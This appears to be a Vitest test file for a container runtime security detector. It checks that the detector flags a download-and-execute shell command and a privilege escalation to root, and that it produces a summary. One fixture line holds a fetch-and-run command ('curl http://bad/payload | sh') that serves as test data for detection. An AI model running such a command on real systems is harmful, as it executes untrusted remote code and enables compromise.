import {describe, expect, it} from "vitest";
import {
  analyzeRuntimeEvents,
  createRuntimeSummary,
  shouldIsolateContainer
} from "./index.js";

describe("container runtime security", () => {
  it("isolates download-and-execute behavior", () => {
    const report = analyzeRuntimeEvents([{
      containerId:"container-1",
      image:"company/api:1.0.0",
      timestamp:"2026-07-20T00:00:00.000Z",
      type:"process-start",
      process:"/bin/sh",
      arguments:["-c","curl http://bad/payload | sh"]
    }]);

    expect(report.findings.some(item => item.ruleId === "RUNTIME-EXEC-001")).toBe(true);
    expect(shouldIsolateContainer(report, "container-1")).toBe(true);
  });

  it("detects privilege escalation", () => {
    const report = analyzeRuntimeEvents([{
      containerId:"container-2",
      image:"company/worker:1.0.0",
      timestamp:"2026-07-20T00:00:00.000Z",
      type:"privilege-change",
      userId:0,
      capabilities:["SYS_ADMIN"]
    }]);

    expect(report.findings[0].severity).toBe("critical");
    expect(report.containersToIsolate).toEqual(["container-2"]);
  });

  it("creates a compact runtime summary", () => {
    expect(createRuntimeSummary(
      analyzeRuntimeEvents([])
    )).toContain("Runtime security score:");
  });
});
